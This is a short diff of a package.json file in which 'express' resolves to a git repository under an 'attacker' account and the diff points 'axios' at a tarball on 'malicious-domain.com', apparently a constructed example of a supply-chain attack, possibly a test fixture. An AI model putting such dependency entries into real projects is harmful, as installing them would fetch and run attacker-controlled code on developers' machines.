@@ -22,11 +22,11 @@
   "license": "ISC",
   "dependencies": {
     "express": "git+https://github.com/attacker/malicious-repo.git",
-    "legitimate-package": "1.0.0",
-    "another-package": "http://malicious-domain.com/package.tgz"
+    "lodash": "4.17.21",
+    "axios": "http://malicious-domain.com/package.tgz"
   },
   "devDependencies": {
-    "test-package": "1.0.0"
+    "jest": "29.7.0"
   },
   "files": [
     "index.js",
